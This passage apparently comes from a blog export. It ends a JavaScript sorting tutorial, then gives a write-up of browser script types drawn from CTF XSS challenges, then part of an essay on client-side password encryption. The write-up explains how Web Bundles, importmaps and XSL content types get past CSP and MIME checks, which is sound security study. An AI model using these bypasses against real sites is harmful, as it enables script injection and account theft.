&#123; result[nowIndex++] = leftArray[left++]; &#125; while (right &lt; rightLength) &#123; result[nowIndex++] = rightArray[right++]; &#125; // Return the merged array return result; &#125; const _mergeSort = (arr) => &#123; const length = arr.length; if (length &lt;= 1) return arr; // Divide the array into two halves const middle = Math.floor(length / 2); // Sort the left half const leftArray = _mergeSort(arr.slice(0, middle)); // Sort the right half const rightArray = _mergeSort(arr.slice(middle, length)); // Merge the two halves and return the result return merge(leftArray, rightArray); &#125; return _mergeSort(arr); &#125; For me, the simpler version is more intuitive because you just slice the array into two halves, sort them, and then merge them back together. However, the more space-efficient approach is to modify the original array directly. In this case, the parameters are a bit different: function mergeSort = (arr) => &#123; const merge = (array, start, middle, end) => &#123; // Declare a temporary array to hold the merged result let temp = []; let nowIndex = 0; let left = start; let right = middle + 1; // Same as before while (left &lt;= middle &amp;&amp; right &lt;= end) &#123; if (array[left] &lt; array[right]) &#123; temp[nowIndex++] = array[left++]; &#125; else &#123; temp[nowIndex++] = array[right++]; &#125; &#125; while (left &lt;= middle) &#123; temp[nowIndex++] = array[left++]; &#125; while (right &lt;= end) &#123; temp[nowIndex++] = array[right++]; &#125; // Put the merged array back into array[start ~ end] for (let i = start; i &lt;= end; i++) &#123; array[i] = temp[i - start]; &#125; &#125; // Sort from start to end const _mergeSort = (array, start, end) => &#123; if (end &lt;= start) return; const middle = Math.floor((start + end) / 2); // Sort the left and right halves _mergeSort(array, start, middle); _mergeSort(array, middle + 1, end); merge(array, start, middle, end); return array; &#125; return _mergeSort(arr, 0, arr.length - 1); &#125; Because it directly modifies the original array, you need to pass in a few more numbers to indicate which part of the array you want to sort. After calling the function, you can assume that the specified part of the array is already sorted. The basic process is the same as the simplified version above, but it saves some memory space. Quick SortAt first, I thought Quick Sort was quite complicated, but after understanding the principle, I found it not that difficult. The principle is actually quite simple: Find a number and adjust it so that the elements on the left are smaller than it, and the elements on the right are larger than it. Then do the same thing on both sides. We call that number the pivot, which divides the sequence into two sides. For example, if we have a sequence: 14, 7, 6, 9, 10, 20, 15 We choose 14 as the pivot, and after adjustment, it becomes: 7, 6, 9, 10, 14, 20, 15. All the elements on the left are smaller than it, and all the elements on the right are larger than it. When you adjust 14, this element is actually sorted! Because the left is smaller than it, and the right is larger than it, so this number is sorted. Then just do Quick Sort on the two sides that have not been sorted yet. The core of Quick Sort is how to find that number. If you find the median of the sequence, the efficiency is the highest. If you find the smallest number, it is the worst case, and the time complexity becomes O(n^2), which is the same as not dividing. We assume that the first number is the pivot, which is more convenient. Another problem is how to adjust the number to make the left smaller than it and the right larger than it. We can maintain a variable called splitIndex, so that all the elements to the left of this index are smaller than the pivot, and this index itself and the elements to the right of it are larger than the pivot. When you scan the array and find an element smaller than the pivot, swap this element with the element at splitIndex, and then increase splitIndex by 1. Finally, remember to swap the pivot with the last element smaller than it, which can put the pivot in the correct position. You can refer to the gif below or go to VISUALGO to see it. (Source: https://github.com/hustcc/JS-Sorting-Algorithm/blob/master/6.quickSort.md) function quickSort = (arr) => &#123; const swap = (array, i , j) => &#123; [array[i], array[j]] = [array[j], array[i]]; &#125; const partition = (array, start, end) => &#123; let splitIndex = start + 1; for (let i = start + 1; i &lt;= end; i++) &#123; if (array[i] &lt; array[start]) &#123; swap(array, i, splitIndex); splitIndex++; &#125; &#125; // Remember to swap the pivot with the last element smaller than it swap(array, start, splitIndex - 1); return splitIndex - 1; &#125; const _quickSort = (array, start, end) => &#123; if (start >= end) return array; // Adjust the sequence in partition and return the index of the pivot const middle = partition(array, start, end); _quickSort(array, start, middle - 1); _quickSort(array, middle + 1, end); return array; &#125;; return _quickSort(arr, 0, arr.length - 1); &#125; Heap SortHeap is a data structure, and there are two types: max heap and min heap. The principles of the two types are actually the same, and we will talk about max heap directly. Let’s take a look at a picture of max heap: (Source: https://www.tutorialspoint.com/data_structures_algorithms/heap_data_structure.htm) You can see that the max heap satisfies two properties: The parent node is always greater than the child node. The root node of the entire tree is always the maximum value (which can be deduced from 1). It is also easy to represent the heap using an array, like this: (Source: http://notepad.yehyeh.net/Content/Algorithm/Sort/Heap/Heap.php) So heap sort uses this data structure for sorting, and the process is simple: First, build the max heap of the array read in (at this time, arr[0] is definitely the maximum value of this array). Swap arr[0] with the last node (which is actually the last unsorted node). Adjust to max heap and return to step 2. Heap sort is actually a bit complicated, complicated enough to be a separate article… But in simple terms, it is an improved version of selection sort, selecting the maximum value each time, and then adjusting the remaining numbers to max heap. function heapSort = (arr) => &#123; function heapify(arr, length, node) &#123; const left = node * 2 + 1; const right = node * 2 + 2; // Assume that the largest node is itself first let max = node; if (left &lt; length &amp;&amp; arr[left] > arr[max]) &#123; max = left; &#125; if (right &lt; length &amp;&amp; arr[right] > arr[max]) &#123; max = right; &#125; // If either the left or right side is larger than the node if (max !== node) &#123; // Swap the two [arr[node], arr[max]] = [arr[max], arr[node]]; // Then continue to heapify heapify(arr, length, max); &#125; &#125; // build max heap const length = arr.length; for (let i = Math.floor(length / 2) - 1; i>=0; i--) &#123; heapify(arr, length, i); &#125; // Sort for (let i = length - 1; i > 0; i--) &#123; [arr[0], arr[i]] = [arr[i], arr[0]]; heapify(arr, i, 0); &#125; return arr; &#125; SummaryAfter careful study, you will find that every sorting algorithm has something worth referencing, and each sorting method is quite interesting. You will also find that understanding the principles is one thing, and whether or not you can write it is another. This article can be regarded as my own sorting algorithm notes. If there are any errors, please let me know. If you want to try it out for yourself, I have put it on Github (https://github.com/aszx87410/JavaScript-sorting-algorithm-demo), with test cases already written. You can modify it and test it directly, which should be quite convenient. Because of the testing process, each sorting algorithm is prefixed with: arr = arr.slice() to avoid modifying the original array. The testing process is also quite interesting. I found that some ES6 syntax (such as the trendy swap syntax or even let) sometimes slows down execution speed. Therefore, I previously changed all the syntax back to ES5 and found that the efficiency was much faster, but this article is not about efficiency, so all the syntax is still in ES6. References [Algorithm] Heap Sort Common Sorting Algorithms - Heap Sort Sorting Algorithm: Heap Sort JS Algorithm: Heap Sort Using Heap Sort JS-Sorting-Algorithm&#x2F;7.heapSort.md Learning Data Structures and Algorithms with JavaScript: Sorting and Searching","link":"/2017/08/27/en/review-the-classical-sort-algorithm-with-javascript/"},{"title":"What do you know about script type?","text":"Recently, I encountered many problems related to content type, so I decided to write an article to record them. As usual, it’s not interesting to directly give the answers. Let’s start with three questions: Question 1In the following code, what should be the content type of a.js to successfully load the code? (Assuming MIME type sniffing is turned off) For example, text/javascript is one answer. Are there any other answers? &lt;script src=\"https://example.com/a.js\"> Question 2What values can be filled in “???” below? For example, text/javascript is one answer, and module is also an answer. &lt;script type=\"???\"> &lt;/script> Question 3Now you have a webpage /test. What content-type should be set in the response so that the browser can execute the JS code after loading? For example, text/html is one answer, and text/xml is also an answer. Now let’s take a look at the answers. Question 1: Content types that &lt;script&gt; can acceptThe idea for this question and answer comes from a XSS challenge posted by @ankursundara at the end of last year: https://twitter.com/ankursundara/status/1460810934713081862 Part of the code is as follows: @app.post('/upload') def upload(): try: file_storage = request.files['file'] mimetype = file_storage.mimetype.lower() or 'application/octet-stream' if 'script' in mimetype: mimetype = 'application/octet-stream' content = file_storage.read().decode('latin1') # dont DOS please if len(content) &lt; 1024*1024: data = &#123; 'mimetype': mimetype, 'content': content &#125; filename = token_hex(16) store.set(filename, json.dumps(data), ex=300) return redirect(f'/uploads/&#123;filename&#125;', code=302) except: pass return 'Invalid Upload', 400 @app.get('/uploads/&lt;filename>') def get_upload(filename): data = store.get(filename) if data: data = json.loads(data) return data['content'].encode('latin1'), 200, &#123;'Content-Type': data['mimetype']&#125; else: return \"Not Found\", 404 @app.after_request def headers(response): response.headers[\"Content-Security-Policy\"] = \"script-src 'self'; object-src 'none';\" response.headers[\"X-Content-Type-Options\"] = 'nosniff' return response Simply put, you can upload any file, but if the file’s MIME type contains script, it will become application/octet-stream. And X-Content-Type-Options is set to nosniff, so whatever MIME type is set is what it is. The goal is to successfully execute XSS. From the above code, it is not difficult to see that you can upload an HTML file, but because CSP has script-src &#39;self&#39;, even if you can upload HTML, you cannot use inline script, and can only use &lt;script src=&quot;/uploads/xxx&quot;&gt; to introduce it. And if the content type of /uploads/xxx is application/octet-stream, Chrome will directly display an error message: Refused to execute script from ‘https://uploader.c.hc.lc/uploads/xxx‘ because its MIME type (‘application&#x2F;octet-stream’) is not executable, and strict MIME type checking is enabled. So the goal of this question is clear: to find a MIME type that does not contain script but can still be successfully loaded by the browser. After seeing this question, I first went to look at the Chromium source code. Using Google search with the error message just now will make it easier to find: &quot;strict MIME type checking is enabled&quot; site:https://chromium.googlesource.com/ Through the search results, we can directly locate this file: https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/dom/ScriptLoader.cpp However, this file is already very old, but at least we know that it is part of blink, so we can go to blink in Chromium to find similar files, and we can find third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;script&#x2F;script_loader.cc. After comparing the old and new versions, we can find the IsValidClassicScriptTypeAndLanguage function: // &lt;specdef href=\"https://html.spec.whatwg.org/C/#prepare-a-script\"> bool IsValidClassicScriptTypeAndLanguage( const String&amp; type, const String&amp; language, ScriptLoader::LegacyTypeSupport support_legacy_types) &#123; // FIXME: IsLegacySupportedJavaScriptLanguage() is not valid HTML5. It is used // here to maintain backwards compatibility with existing web tests. The // specific violations are: // - Allowing type=javascript. type= should only support MIME types, such as // text/javascript. // - Allowing a different set of languages for language= and type=. language= // supports Javascript 1.1 and 1.4-1.6, but type= does not. if (type.IsNull()) &#123; // &lt;spec step=\"8\">the script element has no type attribute but it has a // language attribute and that attribute's value is the empty string, // or&lt;/spec> // // &lt;spec step=\"8\">the script element has neither a type attribute // nor a language attribute, then&lt;/spec> if (language.IsEmpty()) return true; // &lt;spec step=\"8\">Otherwise, the element has a non-empty language attribute; // let the script block's type string for this script element be the // concatenation of the string \"text/\" followed by the value of the language // attribute.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(\"text/\" + language)) return true; // Not spec'ed. if (MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(language)) return true; &#125; else if (type.IsEmpty()) &#123; // &lt;spec step=\"8\">the script element has a type attribute and its value is // the empty string, or&lt;/spec> return true; &#125; else &#123; // &lt;spec step=\"8\">Otherwise, if the script element has a type attribute, let // the script block's type string for this script element be the value of // that attribute with leading and trailing ASCII whitespace // stripped.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType( type.StripWhiteSpace())) &#123; return true; &#125; // Not spec'ed. if (support_legacy_types == ScriptLoader::kAllowLegacyTypeInTypeAttribute &amp;&amp; MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(type)) &#123; return true; &#125; &#125; return false; &#125; Then, using IsSupportedJavaScriptMIMEType to search, we can find the supported MIME types in third_party&#x2F;blink&#x2F;common&#x2F;mime_util&#x2F;mime_util.cc: // Support every script type mentioned in the spec, as it notes that \"User // agents must recognize all JavaScript MIME types.\" See // https://html.spec.whatwg.org/#javascript-mime-type. const char* const kSupportedJavascriptTypes[] = &#123; \"application/ecmascript\", \"application/javascript\", \"application/x-ecmascript\", \"application/x-javascript\", \"text/ecmascript\", \"text/javascript\", \"text/javascript1.0\", \"text/javascript1.1\", \"text/javascript1.2\", \"text/javascript1.3\", \"text/javascript1.4\", \"text/javascript1.5\", \"text/jscript\", \"text/livescript\", \"text/x-ecmascript\", \"text/x-javascript\", &#125;; From the comments, we can see the location of the spec, and the list provided is the same as the answer to the first question. All these MIME types can be loaded as scripts. However, we can notice that each MIME type contains a script. At this point, I got stuck, but the author released a hint called Origin trials, which led to a feature under experimentation called Web Bundles, which is the answer to this question. What is a Web Bundle? Simply put, a Web Bundle is a package that bundles a bunch of data (HTML, CSS, JS…) into a .wbn file. The article mentioned an example: if your friend wants to share a standalone web game with you in an offline environment, it is generally impossible (without considering setting up a server on your own computer). But with Web Bundles, it can package the game into a .wbn file and send it to you. When you receive it, you can simply throw it into the browser and open it, just like an app. In addition to loading the entire app, specific resources can also be loaded from the Web Bundle. Here is a complete introduction: Explainer: Subresource loading with Web Bundles. The example looks like this: &lt;script type=\"webbundle\"> &#123; \"source\": \"https://example.com/dir/subresources.wbn\", \"resources\": [\"https://example.com/dir/a.js\", \"https://example.com/dir/b.js\", \"https://example.com/dir/c.png\"] &#125; &lt;/script> In this way, when you load https://example.com/dir/a.js in a web page, the browser will first look for this resource in subresources.wbn instead of downloading it directly from the server. So the answer to the XSS challenge mentioned earlier is to package the JS you want to load into a web bundle. Its MIME type is application/webbundle, so it will not be blocked. Then, load it as shown above, and the MIME type of the JS file loaded from the web bundle will be correct, so it can be executed successfully. However, why didn’t we see this feature when we were looking at the Chromium code earlier? This is because we were too focused on the MIME type, so we only looked at IsValidClassicScriptTypeAndLanguage, but we should actually look at GetScriptTypeAtPrepare that calls it: ScriptLoader::ScriptTypeAtPrepare ScriptLoader::GetScriptTypeAtPrepare( const String&amp; type, const String&amp; language, LegacyTypeSupport support_legacy_types) &#123; if (IsValidClassicScriptTypeAndLanguage(type, language, support_legacy_types)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is a JavaScript MIME &#x2F;&#x2F; type essence match, the script&#39;s type is &quot;classic&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kClassic; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kModule)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is an ASCII &#x2F;&#x2F; case-insensitive match for the string &quot;module&quot;, the script&#39;s type is &#x2F;&#x2F; &quot;module&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kModule; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kImportmap)) &#123; return ScriptTypeAtPrepare::kImportMap; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kSpeculationrules)) &#123; return ScriptTypeAtPrepare::kSpeculationRules; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kWebbundle)) &#123; return ScriptTypeAtPrepare::kWebBundle; &#125; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If neither of the above conditions are true, then &#x2F;&#x2F; return. No script is executed.&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kInvalid; &#125; We can see that calling IsValidClassicScriptTypeAndLanguage is only the first step, and there are other steps later, where other types can be passed in, which happens to be the answer to the second question. Question 2: Types that &lt;script&gt; can acceptI thought about this question because there is a question called YACA in PlaidCTF 2022, which is testing this point. The official answer is here: https://github.com/zwade/yaca/tree/master/solution When I was doing this question, I completely forgot that I had done the Web Bundle question before, so I didn’t look in that direction. But anyway, from the code posted earlier, we can see that the answer to this question is the answer to the first question (those MIME types) plus the following four types: module importmap speculationrules webbundle Module is nothing special, as mentioned earlier with webbundle. Let’s take a look at importmap and speculationrules. The import map specification is here: https://github.com/WICG/import-maps Simply put, the problem that import map wants to solve is that although browsers already support module and import, you still can’t do this in the browser: import moment from \"moment\"; import &#123; partition &#125; from \"lodash\"; You can only write a path like this: import moment from \"/node_modules/moment/src/moment.js\"; import &#123; partition &#125; from \"/node_modules/lodash-es/lodash.js\"; The solution of import map is to introduce a mapping table, so you can only use names to import: &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"moment\": \"/node_modules/moment/src/moment.js\", \"lodash\": \"/node_modules/lodash-es/lodash.js\" &#125; &#125; &lt;/script> The topic mentioned at the beginning is to use this point to replace the loaded files with a mapping table, like this: &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"/js/ast-to-js.mjs\": \"/js/eval-code.mjs\" &#125; &#125; &lt;/script> Next, let’s take a look at speculationrules, the specification is here: https://github.com/WICG/nav-speculation This feature is mainly designed to solve some problems caused by pre-rendering. I haven’t studied it in depth yet, but it looks like this: &lt;script type=\"speculationrules\"> &#123; \"prerender\": [ &#123;\"source\": \"list\", \"urls\": [\"/page/2\"], \"score\": 0.5&#125;, &#123;\"source\": \"document\", \"if_href_matches\": [\"https://*.wikipedia.org/**\"], \"if_not_selector_matches\": [\".restricted-section *\"], \"score\": 0.1&#125; ] &#125; &lt;/script> It uses JSON to specify the pre-rendering rules, which is quite different from the previous way of using &lt;link rel=&quot;prerender&quot;&gt;. Question 3The inspiration also comes from CTF, Securinets CTF Quals 2022’s PlanetSheet. When the content type is text/xsl, you can use &lt;x:script&gt; to execute XSS. This classic research is mentioned in every write-up: Content-Type Research. You can click in to see the details. The following five content types can execute XSS in all browsers: text&#x2F;html application&#x2F;xhtml+xml application&#x2F;xml text&#x2F;xml image&#x2F;svg+xml I was curious and looked up Chromium’s code and found that there are two other content types that are always grouped with the others: application&#x2F;rss+xml application&#x2F;atom+xml Code: xsl_style_sheet_resource.cc static void ApplyXSLRequestProperties(FetchParameters&amp; params) &#123; params.SetRequestContext(mojom::blink::RequestContextType::XSLT); params.SetRequestDestination(network::mojom::RequestDestination::kXslt); &#x2F;&#x2F; TODO(japhet): Accept: headers can be set manually on XHRs from script, in &#x2F;&#x2F; the browser process, and... here. The browser process can&#39;t tell the &#x2F;&#x2F; difference between an XSL stylesheet and a CSS stylesheet, so it assumes &#x2F;&#x2F; stylesheets are all CSS unless they already have an Accept: header set. &#x2F;&#x2F; Should we teach the browser process the difference? DEFINE_STATIC_LOCAL(const AtomicString, accept_xslt, (&quot;text&#x2F;xml, application&#x2F;xml, application&#x2F;xhtml+xml, &quot; &quot;text&#x2F;xsl, application&#x2F;rss+xml, application&#x2F;atom+xml&quot;)); params.MutableResourceRequest().SetHTTPAccept(accept_xslt); &#125; However, these two are not loaded as XML, so I looked it up and found this bug: Issue 104358: Consider allowing more types to parse as XML, which mentions this commit added in 2009: commit, which added the following code: if (mime_type &#x3D;&#x3D; &quot;application&#x2F;rss+xml&quot; || mime_type &#x3D;&#x3D; &quot;application&#x2F;atom+xml&quot;) &#123; &#x2F;&#x2F; Sad face. The server told us that they wanted us to treat the response &#x2F;&#x2F; as RSS or Atom. Unfortunately, we don&#39;t have a built-in feed previewer &#x2F;&#x2F; like other browsers. We can&#39;t just render the content as XML because &#x2F;&#x2F; web sites let third parties inject arbitrary script into their RSS &#x2F;&#x2F; feeds. That leaves us with little choice but to practically ignore the &#x2F;&#x2F; response. In the future, when we have an RSS feed previewer, we can &#x2F;&#x2F; remove this logic. mime_type.assign(&quot;text&#x2F;plain&quot;); response_-&gt;response_head.mime_type.assign(mime_type); &#125; Because RSS feeds may contain third-party content, if they are rendered directly as XML, there is a risk of XSS, so these two are forcibly turned off. Finally, note a tool that can help search for source code, which is super useful: https://sourcegraph.com/search","link":"/2022/04/24/en/script-type/"},{"title":"Is it meaningful to encrypt passwords when calling APIs on the website frontend?","text":"Recently, someone posted a post in the Facebook frontend exchange community, which he saw a problem: Is there a problem with passing account and password json plaintext when logging in to the API?, and wanted to know everyone’s opinion on this issue. Most of the answers below think that “using HTTPS is enough, there is no need to implement an additional layer of encryption, and there is not much meaning.” To be honest, I used to think so too, and there have been similar discussions in the community in the past. At that time, I thought that since HTTPS already exists, and the purpose of HTTPS itself is to ensure the security of transmission, why do we need to do encryption ourselves? But after being exposed to information security for the past year or two, my thinking has changed. I think it is meaningful for the frontend to encrypt passwords before transmission, and I will explain my reasons in detail below. Define the problemBefore getting into the topic, I want to define the problem more clearly, so as not to compare two completely different situations. Under the original post, there are many comments discussing different issues. It is important to define the problem clearly. First, the objects we want to compare are: Pass the plaintext password directly when calling the login API without doing anything under the premise of using HTTPS Encrypt the password before calling the login API under the premise of using HTTPS, and then send it to the server It should be noted here that “both situations are HTTPS”, so if you want to talk about “no need to invent new technologies” or “inventing new encryption methods yourself is not safer” and so on, they are not applicable under this premise. Because the transmission layer still relies on HTTPS for transmission, there is no new way invented at this stage. I just add an extra layer of encryption to the transmitted data at the application layer. Next, regardless of the cost, let’s look at the advantages and disadvantages from a technical perspective (the cost-related issues will be discussed later). Finally, the scenario I want to deal with here is “encrypting passwords” rather than hash. This is because I think the situation of hash is more complicated. I want to use encryption as an example first, and this encryption is “asymmetric encryption”. That is, we can imagine that there is already a public key stored on the client side (of course, everyone can get it), and before sending the request, JavaScript will encrypt the password with the public key and then send it out, and the server will use the private key to decrypt it. After getting the password, hash it and store it in the database. In summary, the problem I want to deal with in this article is: “After using HTTPS, what is the difference between encrypting the password before calling the login API or doing nothing?” And we can divide the answer into two parts: Assuming that HTTPS is cracked, what is the difference? Assuming that HTTPS is secure, what is the difference? What is the difference if HTTPS is not secure?First, let’s think about what kind of situation will cause HTTPS to be insecure, and which parts of the system does the attacker control? It can be briefly divided into four situations for discussion: The attacker controls the entire computer and trusts malicious certificates The attacker successfully executed a man-in-the-middle attack The attacker can listen to requests at the network layer and use vulnerabilities to obtain plaintext The attacker directly attacks the HTTPS server The attacker controls the entire computer and trusts malicious certificatesIf it is this type of situation, it doesn’t matter whether there is encryption or not, because the attacker has other better means to obtain your password. The attacker successfully executed a man-in-the-middle attackWhat if it is “the attacker successfully executed a man-in-the-middle attack (Man-In-The-Middle)”? Your computer is fine, but the packet is intercepted by the man-in-the-middle during the transmission process. Under this premise, the plaintext password can be directly obtained without encryption, and if there is encryption, the attacker can only obtain the encrypted ciphertext instead of the plaintext. However, it should be noted that since it is called a man-in-the-middle attack, the attacker can also send forged responses to you in addition to listening to your request, and replace the part of the frontend used to encrypt the password. Therefore, regardless of whether the password is encrypted or not, the attacker can obtain the plaintext, but if there is encryption, the cost for the attacker to obtain the password is higher (need to find where the encryption is, and then change that part). The attacker can listen to requests at the network layer and use vulnerabilities to obtain plaintextThe difference between this situation and the previous one is that this one can only read, not write. If there is a way to decrypt the request packet, you can see the plaintext. So if the password is encrypted first, the attacker cannot obtain the plaintext of the password. It should be noted here that although the plaintext cannot be obtained, the attacker can still log in to your account by resending the request (assuming there is no other mechanism), so your account is still stolen, but the attacker does not know the plaintext of your password. Does this make a difference? Yes! Assuming that someone knows your password in plaintext, they can use your account and password to try various services. If you use the same account and password for other websites, they will also be compromised (commonly known as a credential stuffing attack). Therefore, encrypting passwords in this situation is obviously more secure. You may ask, “Under what circumstances can an attacker obtain plaintext HTTPS?” Here is a presentation by the US Department of Health and Human Services (HHS): SSL&#x2F;TLS Vulnerabilities, which records some vulnerabilities that SSL&#x2F;TLS has had in the past, so it is indeed possible to obtain plaintext HTTPS. However, knowing that “it is possible” is not enough. The question should be “Is the probability high?” When discussing risks, the severity and seriousness of the risk are usually used to determine how to deal with the risk. The answer is “the probability is very low.” The vulnerabilities in the presentation are from 2017 and are related to some old and problematic encryption algorithms. In addition, many other conditions must be met to execute the attack, so I think the probability is indeed very low. For example, DROWN (Decrypting RSA with Obsolete and Weakened eNcryption), published in 2016, requires the server to support SSLv2, and the attacker must be able to capture the encrypted TLS connection. After meeting these conditions, a lot of calculations can be performed to decrypt one of the 900 connections, and the computational cost at that time was $440, about NT$13,000. In summary, for this situation, we can say: Assuming that the attacker can obtain plaintext HTTPS, it is indeed safer to encrypt at the application layer, but the cost of meeting this assumption is very high, and the probability is very low. Attacker directly attacks HTTPS serverI am referring to the Heartbleed vulnerability that occurred in 2014. Attackers can read the server’s memory through the OpenSSL vulnerability. This situation is similar to the previous one. If the client encrypts the password first, what the attacker reads on the server is the encrypted password, and they do not know what the plaintext password is. Therefore, the conclusion is the same as before, encrypting the password is safer. SummaryWe just discussed several situations where “HTTPS becomes insecure.” From past cases, we know that “HTTPS becomes insecure” is possible. If the attacker can read plaintext transmitted through HTTPS, encrypting the password at the application layer can prevent the attacker from obtaining the plaintext password, making it safer than not encrypting it. If we want to be more detailed, we can approach it from two dimensions: severity and possibility. In terms of severity, whether the password is encrypted or not, as long as the attacker can obtain the content of the request, your account has already been compromised. The only difference is whether the attacker can obtain the plaintext password. If they can, they can execute a credential stuffing attack and try the password on more websites. The possibility is the possibility of “plaintext HTTPS being obtained.” From past experiences and research, although it is possible, the probability is very low in 2023. Therefore, our conclusion at this stage should be: If the attacker can bypass HTTPS and obtain plaintext requests, it is indeed safer to encrypt the password at the application layer, but it should be noted that it is very difficult to meet this premise, and the probability is extremely low. Assuming HTTPS is secureNext, we will discuss the second situation, assuming that HTTPS is secure, and no one can see the plaintext content in the middle. This should also be the premise that most people assume in the comment area. What are the risks in this situation? There is a risk that occurs in real life and has indeed occurred, which is logging. As a front-end engineer, it is reasonable to add some error tracking services to the front-end. If we directly implement a mechanism of “record the request whenever the server returns 5xx,” if the login API encounters this situation, you can see the user’s plaintext password in the log. Moreover, not only the front-end but also the back-end may have similar mechanisms. When encountering some problems, the entire request is written to the log file for future viewing and debugging. If you are not careful, the password may be written in it. In this situation, it is obviously beneficial to encrypt the password on the client-side. In these error handling logs, the recorded password will be ciphertext, and unless you have the key, you will not know the user’s password. I found an article on the Internet that has the same argument as mine: The case for client-side hashing: logging passwords by mistake, which includes many reference links to cases where major companies accidentally recorded plaintext passwords. Then there is a small point to mention. The article above is about “hashing on the client side”, which is slightly different from the “asymmetric encryption on the client side” that I set at the beginning of this article. Hashing is a bit more secure and ensures that no one on the server really knows what your password plaintext is. Anyway, encrypting or hashing the password on the client side can prevent the user’s password plaintext from accidentally appearing in the log, which is obviously an additional advantage. Encryption or Hashing?At the beginning of the article, I mentioned that the situation with hashing is a bit complicated, so I first set the scenario to “asymmetric encryption of passwords” before transmission on the client side, because for the examples I mentioned above, the difference between these two scenarios is not significant. For example, if HTTPS is intercepted in plaintext, no matter whether you perform asymmetric encryption or hashing on the password, you cannot obtain the plaintext password without obtaining the server-side key. So why is the situation with hashing a bit complicated? Suppose we first hash the password on the front end and then transmit it to the back end. Should the back end store it directly in the database? If it is stored directly in the database, when the contents of the database are exposed one day, the attacker will obtain these hashed passwords. Usually, under the premise of salting and strong hashing algorithms, the security of hashed passwords can still be guaranteed, but in this case, it becomes very insecure. Because the content transmitted from the front end to the back end has been hashed, the attacker can directly use the hashed password to log in without knowing what the plaintext is. Although the plaintext is protected, the security of the original hash is lost. Therefore, if you want to do client-side hashing, the server-side must also do it again after receiving it. In this way, even if the database is stolen, the attacker cannot use the hash in the database to log in directly. Some people may be curious like me: “Isn’t doing two hashes less secure?” We can see how Google says in Modern password security for system designers: Have the client computer hash the password using a cryptographically secure algorithm and a unique salt provided by the server. When the password is received by the server, hash it again with a different salt that is unknown to the client. Be sure to store both salts securely. If you are using a modern and secure hashing algorithm, repeated hashing does not reduce entropy. It looks okay, there is no problem. In short, the safest but more complicated solution seems to be to hash once on the client side, and then hash again when throwing it to the server and store it in the database. In this way, it can be ensured that: When HTTPS fails for various reasons, the attacker cannot obtain the plaintext password On the server side, no one knows the plaintext password of the user The plaintext password will not be recorded in the log due to human error So if it is really more convenient, why isn’t anyone using it? Who is hashing or encrypting on the front end in real life?When I first encountered this problem and said “why no one is using it”, it was actually just “I haven’t encountered anyone using it myself”, but I don’t actually know how the login mechanisms of those well-known websites are implemented. Therefore, I went directly to see the login mechanism of several well-known websites. Let’s take a look at the results together. For convenience of viewing, I removed all content unrelated to account passwords. When I was testing, I basically used test or &#116;&#x65;&#115;&#x74;&#x40;&#116;&#x65;&#x73;&#x74;&#46;&#x63;&#111;&#109; with a simple password like 1234 for testing, and then observed the content of the request. Let’s start with FAANG! FAANGFacebookAPI URL: https://zh-tw.facebook.com/login Request content: email&#x3D;test@test.com encpass&#x3D;#PWD_BROWSER:5:1673256089:AbJQAJUvZZNvh2dZbeDqdu9dp7HWwyHOl3+0sCGjiHMMjvYdxJokpdHE&#x2F;O+E5LIbnakRmDWQfV40ZaB31MaNXFYo1b+RI+LHh6MAdDPa4PJ+BesDp4u8B4F4diVQ+q7idbEhT5wTNaU&#x3D; Unexpectedly, Facebook is a website that implements front-end encryption! The Base64 at the end is not directly Base64 the password, but Base64 the encrypted password. The decoded result is like this: \\x01²P\\x00\\x95/e\\x93o\\x87gYmàêvï]§±ÖÃ!Î\\x97\\x7F´°!£\\x88s\\f\\x8Eö\\x1DÄ\\x9A$¥ÑÄüï\\x84ä²\\x1B\\x9D©\\x11\\x985\\x90&#125;^4e wÔÆ\\x8D\\\\V(Õ¿\\x91#âÇ\\x87£\\x00t3Úàò~\\x05ë\\x03§\\x8B¼\\x07\\x81xv%Pú®âu±!O\\x9C\\x135¥ AmazonAPI URL: https://www.amazon.com/ap/signinRequest Content: email=test@test.com&amp;password=1234 AppleAPI URL: https://idmsa.apple.com/appleauth/auth/signinRequest Content: &#123;&quot;accountName&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;1234&quot;&#125; NetflixAPI URL: https://www.netflix.com/tw/loginRequest Content: userLoginId=test@test.com&amp;password=1234 GoogleAPI URL: https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute Request Content: f.req&#x3D;[[[&quot;14hajb&quot;,&quot;[1,1,null,[1,null,null,null,[\\&quot;1234\\&quot;,null,true]]]] It seems that only Facebook has implemented it among the FAANG companies. Then I suddenly became curious about whether other commonly used services have implemented it, and I posted the results below. GitHubAPI URL: https://github.com/sessionRequest Content: login=test@test.com&amp;password=1234 MicrosoftAPI URL: https://login.live.com/ppsecure/post.srfRequest Content: login=test@test.com&amp;passwd=1234 IBM CloudAPI URL: https://cloud.ibm.com/login/doLoginRequest Content: &#123;&quot;username&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;1234&quot;&#125; It seems that only a few have implemented it. What about cybersecurity companies? Do they have their own implementations? Cybersecurity CompaniesKasperskyAPI URL: https://eu.uis.kaspersky.com/v3/logon/proceedRequest Content: &#123;&quot;login&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;12345678&quot;&#125; Trend MicroAPI URL: https://sso1.trendmicro.com/api/usersigninauthRequest Content: &#123;&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;12345678&quot;&#125; TenableAPI URL: 